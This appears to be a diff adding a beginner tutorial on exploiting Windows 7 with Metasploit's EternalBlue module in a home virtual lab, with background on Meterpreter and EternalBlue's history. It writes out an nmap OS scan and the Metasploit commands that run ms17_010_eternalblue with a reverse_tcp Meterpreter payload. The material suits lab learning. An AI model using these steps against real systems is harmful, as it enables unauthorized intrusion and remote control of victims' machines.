@@ -1,0 +1,42 @@
+How to attack Windows7 using Metasploit
+
+What is Metasploit?
+Metasploit is a tool that helps in Penetration Test and IDS signature and provide so many exploits that helps to find security vulnerability.
+
+What is Meterpreter?
+Meterpreter is a tool that is packaged together with the Metasploit framework. The features of Meterpreter are:
+
+1. Does not create any files on the hard disk, it resides in memory and attaches itself to a process.
+2. client-server communication is in the form of a type-length-value (TLV) format.
+3. client-server communication between the attacker machine and victim machine is encrypted.
+4. It provides a platform to write extensions.
+
+What is EternalBlue?
+EternalBlue, sometimes stylized as ETERNALBLUE is an exploit developed by the U.S. National Security Agency (NSA) according to testimony by former NSA employees. It was leaked by the Shadow Brokers hacker group on April 14, 2017, and was used as part of the worldwide WannaCry ransomware attack on May 12, 2017. The exploit was also used to help carry out the 2017 NotPetya cyberattack on June 27, 2017, and reported to be used as part of the Retefe banking trojan since at least September 5, 2017. EternalBlue that based on multiple vulnerabilities in the Windows implementation of SMB protocol.
+
+Exploit :
+Here we are after explaining some important operative word, this exploitation is really easy I recommend all security beginner (like me :p) to start with those simple steps to have an idea of “how you can attack a target” and know exactly if you are interested to work with the blue team or red team, I highly recommend to understand EternalBlue at least for 60%.
+
+So we will need two .iso images Windows7 64bits or 32bits, Kali and Oracle VM Virtual Box LINK, let’s begin.
+
+STEP 1:
+Create two new Virtual machine Kali and Windows 7
+Go to Networks settings for both machines choose bridged or NAT (I personally prefer to use bridged) so your both machine can communicate between them and they dynamically get IP addresses.
+Check you IP@ on Windows7 this will be our Target T
+
+STEP 2:
+scan the target
+In real life you will not get the IP address of the victim easily so first you need to run a full scan on your network and search for some important details like OS’s version… using NMAP
+
+$ nmap -v -Pn -O <ip>
+
+As we will use EternalBlue we just need to ensure that smb port 445 is open.
+
+STEP 3:
+Run Metasploit
+- Search eternalblue
+- Use exploit/windows/smb/ms17_010_eternalblue
+- set payload windows/x64/meterpreter/reverse_tcp
+- show options
+- set rhost <target ip>
+- exploit/run
